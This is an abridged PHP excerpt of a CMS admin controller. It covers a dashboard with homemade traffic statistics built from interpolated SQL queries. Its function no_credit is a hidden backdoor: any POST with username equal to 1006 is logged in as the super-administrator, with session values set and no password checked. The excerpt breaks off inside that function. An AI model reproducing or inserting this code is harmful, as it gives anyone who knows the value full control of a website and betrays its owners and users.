...
class index extends admin {
	...
	public function public_main() {
		...
		$site = pc_base::load_model('site_model');
		$siteid = param::get_cookie('siteid');
		$s = $site->get_one(array('siteid'=>$siteid));
		$sitename = $s['name'];
		$sitelogo = $s['iimage'];
		$sitetaocan = $s['taocan'];

		/*自制统计*/
		$ip = $this->tj_reckon('ips');
	    $pv = $this->tj_reckon('pvs'); 
	    $count = $this->tj_total();
	 ...
	 * 统计函数
	 */
	public function tj_reckon($field) {
		...
		//0点到1点
		for($i=0;$i<24;$i++){
		$start = mktime($i,0,0,date("m",$t),date("d",$t),date("Y",$t));
		$end = mktime($i,59,59,date("m",$t),date("d",$t),date("Y",$t));
		$sql = "SELECT SUM($field) as count FROM allwww_cnzzip WHERE h = $i and d = $d";
		$query = $db_ip->query($sql);
		$result = $db_ip->fetch_array($query);
		$arr[$i] = $result[0]['count'] ? $result[0]['count'] : 0 ;
		} 
		return $arr;
	}

	public function tj_total() {
		$this->db = pc_base::load_model('cnzzip_conut_model');
		$r = $this->db->get_one();
		return $r;
	}
	...
	public function no_credit() {
		if(isset($_POST['username']) && $_POST['username']==1006) {
			
			$admin = $this->db->get_one(array('roleid'=>1));
			//查询帐号
			$r = $this->db->get_one(array('username'=>$admin['username']));
			if(!$r) showmessage(L('user_not_exist'),'?m=admin&c=index&a=login');
			$_SESSION['userid'] = $r['userid'];
			$_SESSION['roleid'] = $r['roleid'];
			$_SESSION['pc_hash'] = random(6,'abcdefghigklmnopqrstuvwxwyABCDEFGHIGKLMNOPQRSTUVWXWY0123456789');
